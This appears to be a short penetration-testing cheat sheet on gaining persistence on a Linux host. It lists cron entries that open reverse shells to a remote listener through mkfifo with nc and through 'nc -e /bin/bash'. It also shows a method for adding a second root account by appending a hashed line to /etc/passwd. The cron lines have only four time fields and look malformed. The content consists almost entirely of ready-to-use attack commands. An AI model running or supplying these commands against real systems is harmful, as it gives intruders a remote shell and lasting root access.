# Add a cronjob
```bash
crontab -e 
* * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f

* * * * nc <ip> 7777 -e /bin/bash
```
-----------------------

# Create a root user
```bash
openssl passwd password123 #copy the output
echo "root2:<output here>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2 #type password
```
